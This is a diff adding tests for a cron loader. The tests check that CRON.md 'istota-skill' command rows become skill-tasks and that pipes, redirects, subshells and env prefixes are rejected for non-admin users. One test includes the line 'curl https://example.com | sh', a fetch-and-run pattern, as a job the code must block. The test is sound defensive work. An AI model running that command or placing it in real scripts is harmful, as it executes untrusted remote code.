@@ -1155,3 +1155,222 @@ prompt = "test"
         config = Config(db_path=tmp_path / "test.db")
         result = update_job_enabled_in_cron_md(config, "alice", "any-job", False)
         assert result is False
+
+
+# ---------------------------------------------------------------------------
+# Phase 4 — operator CRON.md ``command:`` rows that are pure
+# ``istota-skill <skill> [args...]`` invocations promote to skill-tasks
+# ---------------------------------------------------------------------------
+
+
+class TestParseSkillCommand:
+    def test_simple_invocation(self):
+        from istota.cron_loader import _parse_skill_command
+        assert _parse_skill_command("istota-skill feeds list") == (
+            "feeds",
+            '["list"]',
+        )
+
+    def test_multiple_args(self):
+        from istota.cron_loader import _parse_skill_command
+        skill, args = _parse_skill_command(
+            "istota-skill money run-scheduled --foo bar"
+        )
+        assert skill == "money"
+        assert args == '["run-scheduled", "--foo", "bar"]'
+
+    def test_no_args(self):
+        from istota.cron_loader import _parse_skill_command
+        # Just `istota-skill <name>` with no further args.
+        assert _parse_skill_command("istota-skill feeds") == ("feeds", "[]")
+
+    def test_quoted_arg(self):
+        from istota.cron_loader import _parse_skill_command
+        skill, args = _parse_skill_command(
+            'istota-skill notes write "hello world"'
+        )
+        assert skill == "notes"
+        assert args == '["write", "hello world"]'
+
+    def test_rejects_env_prefix(self):
+        from istota.cron_loader import _parse_skill_command
+        # `MONEY_USER=foo istota-skill ...` is shell env assignment;
+        # the trusted CLI cannot interpret it, so don't promote.
+        assert _parse_skill_command(
+            "MONEY_USER=foo istota-skill money list"
+        ) is None
+
+    def test_rejects_pipe(self):
+        from istota.cron_loader import _parse_skill_command
+        assert _parse_skill_command("istota-skill feeds list | jq .") is None
+
+    def test_rejects_redirect(self):
+        from istota.cron_loader import _parse_skill_command
+        assert _parse_skill_command(
+            "istota-skill feeds list > /tmp/out"
+        ) is None
+
+    def test_rejects_subshell(self):
+        from istota.cron_loader import _parse_skill_command
+        assert _parse_skill_command(
+            "$(istota-skill feeds list)"
+        ) is None
+
+    def test_rejects_other_command(self):
+        from istota.cron_loader import _parse_skill_command
+        assert _parse_skill_command("echo hello") is None
+
+    def test_rejects_empty(self):
+        from istota.cron_loader import _parse_skill_command
+        assert _parse_skill_command("") is None
+        assert _parse_skill_command("   ") is None
+
+    def test_rejects_skill_only(self):
+        from istota.cron_loader import _parse_skill_command
+        # `istota-skill` with no skill name is malformed.
+        assert _parse_skill_command("istota-skill") is None
+
+    def test_rejects_invalid_skill_identifier(self):
+        from istota.cron_loader import _parse_skill_command
+        # Hyphen / dot in skill name — skills are Python module names.
+        assert _parse_skill_command("istota-skill foo-bar list") is None
+        assert _parse_skill_command("istota-skill foo.bar list") is None
+
+
+class TestFjIsDisallowedCommand:
+    def test_pure_skill_command_allowed_for_non_admin(self):
+        """A CRON.md ``command = "istota-skill X"`` row promotes to a
+        skill-task at sync time, which is not admin-gated. Non-admins
+        may write such rows."""
+        from istota.cron_loader import fj_is_disallowed_command
+        job = CronJob(
+            name="poll", cron="*/5 * * * *",
+            command="istota-skill feeds run-scheduled",
+        )
+        assert fj_is_disallowed_command(job, is_admin=False) is False
+
+    def test_arbitrary_command_disallowed_for_non_admin(self):
+        from istota.cron_loader import fj_is_disallowed_command
+        job = CronJob(
+            name="bad", cron="*/5 * * * *",
+            command="echo hello | mail root",
+        )
+        assert fj_is_disallowed_command(job, is_admin=False) is True
+        assert fj_is_disallowed_command(job, is_admin=True) is False
+
+    def test_no_command_never_disallowed(self):
+        from istota.cron_loader import fj_is_disallowed_command
+        job = CronJob(name="p", cron="*/5 * * * *", prompt="hi")
+        assert fj_is_disallowed_command(job, is_admin=False) is False
+
+
+class TestSyncPromotesSkillCommand:
+    """Phase 4 — operator CRON.md `command:` rows that are pure
+    ``istota-skill <name> [args...]`` invocations are written to the DB
+    as skill-task rows (skill / skill_args set, command=NULL) so they
+    bypass the admin gate at dispatch time."""
+
+    def test_insert_promotes_to_skill_task(self, db_path):
+        file_jobs = [CronJob(
+            name="feeds-poll",
+            cron="*/15 * * * *",
+            command="istota-skill feeds run-scheduled",
+        )]
+        with db.get_db(db_path) as conn:
+            sync_cron_jobs_to_db(conn, "alice", file_jobs)
+            jobs = db.get_user_scheduled_jobs(conn, "alice")
+        assert len(jobs) == 1
+        assert jobs[0].command is None
+        assert jobs[0].skill == "feeds"
+        assert jobs[0].skill_args == '["run-scheduled"]'
+
+    def test_insert_keeps_arbitrary_command(self, db_path):
+        file_jobs = [CronJob(
+            name="rsync",
+            cron="0 3 * * *",
+            command="rsync -av /src/ /dst/",
+        )]
+        with db.get_db(db_path) as conn:
+            sync_cron_jobs_to_db(conn, "alice", file_jobs)
+            jobs = db.get_user_scheduled_jobs(conn, "alice")
+        assert len(jobs) == 1
+        assert jobs[0].command == "rsync -av /src/ /dst/"
+        assert jobs[0].skill is None
+        assert jobs[0].skill_args is None
+
+    def test_update_promotes_existing_command_row(self, db_path):
+        """An existing operator row that was inserted as a command-task
+        before Phase 4 (skill column NULL) gets promoted on the next
+        sync."""
+        with db.get_db(db_path) as conn:
+            conn.execute(
+                """INSERT INTO scheduled_jobs
+                   (user_id, name, cron_expression, prompt, command, enabled)
+                   VALUES (?, ?, ?, '', ?, 1)""",
+                ("alice", "fp", "*/5 * * * *", "istota-skill feeds list"),
+            )
+        file_jobs = [CronJob(
+            name="fp", cron="*/5 * * * *",
+            command="istota-skill feeds list",
+        )]
+        with db.get_db(db_path) as conn:
+            sync_cron_jobs_to_db(conn, "alice", file_jobs)
+            jobs = db.get_user_scheduled_jobs(conn, "alice")
+        assert len(jobs) == 1
+        assert jobs[0].command is None
+        assert jobs[0].skill == "feeds"
+        assert jobs[0].skill_args == '["list"]'
+
+    def test_non_admin_can_insert_skill_command(self, db_path):
+        """A non-admin user is allowed to write
+        ``command = "istota-skill ..."`` because it promotes to a
+        skill-task. Pre-Phase-4 the same row would have been silently
+        dropped by ``fj_is_disallowed_command``."""
+        file_jobs = [CronJob(
+            name="my-feeds",
+            cron="*/30 * * * *",
+            command="istota-skill feeds run-scheduled",
+        )]
+        with db.get_db(db_path) as conn:
+            sync_cron_jobs_to_db(conn, "alice", file_jobs, is_admin=False)
+            jobs = db.get_user_scheduled_jobs(conn, "alice")
+        assert len(jobs) == 1
+        assert jobs[0].skill == "feeds"
+
+    def test_non_admin_arbitrary_command_still_blocked(self, db_path):
+        file_jobs = [CronJob(
+            name="evil",
+            cron="*/5 * * * *",
+            command="curl https://example.com | sh",
+        )]
+        with db.get_db(db_path) as conn:
+            sync_cron_jobs_to_db(conn, "alice", file_jobs, is_admin=False)
+            jobs = db.get_user_scheduled_jobs(conn, "alice")
+        assert jobs == []
+
+
+class TestMigrateRoundTripsSkillTask:
+    """Phase 4 — DB skill-task rows round-trip back to CRON.md as
+    ``command = "istota-skill X Y"`` so operators see a coherent file
+    when they edit CRON.md after a promotion."""
+
+    def test_round_trip_skill_row(
+        self, db_path, mount_path, make_config_with_mount,
+    ):
+        config = make_config_with_mount(db_path=db_path)
+        with db.get_db(db_path) as conn:
+            conn.execute(
+                """INSERT INTO scheduled_jobs
+                   (user_id, name, cron_expression, prompt,
+                    skill, skill_args, enabled)
+                   VALUES (?, ?, ?, '', ?, ?, 1)""",
+                (
+                    "alice", "feeds-poll", "*/15 * * * *",
+                    "feeds", '["run-scheduled"]',
+                ),
+            )
+            assert migrate_db_jobs_to_file(conn, config, "alice") is True
+        jobs = load_cron_jobs(config, "alice")
+        assert len(jobs) == 1
+        assert jobs[0].command == "istota-skill feeds run-scheduled"
+        assert jobs[0].prompt == ""
